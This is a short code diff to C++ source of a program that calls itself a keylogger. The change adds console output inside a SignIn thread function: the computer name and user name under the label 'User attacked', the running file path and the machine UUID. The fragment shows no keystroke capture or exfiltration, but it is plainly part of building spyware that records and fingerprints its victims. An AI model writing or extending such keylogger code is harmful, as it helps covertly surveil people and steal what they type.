@@ -31,8 +31,10 @@ void ReadUUID() {
 
 DWORD WINAPI SignIn(LPVOID lParam) {
     ReadUUID();
-    
+
     cout << "Keylogger started on: " << GetCurrentDate() << endl;
+    cout << "User attacked: " << GetComputername() << " # " << GetUsername() << endl;
+    cout << "File Path: " << GetCurrentPath() << endl;
     cout << "Computer UUID: " << Uuid << endl << endl;
 
     return 0;
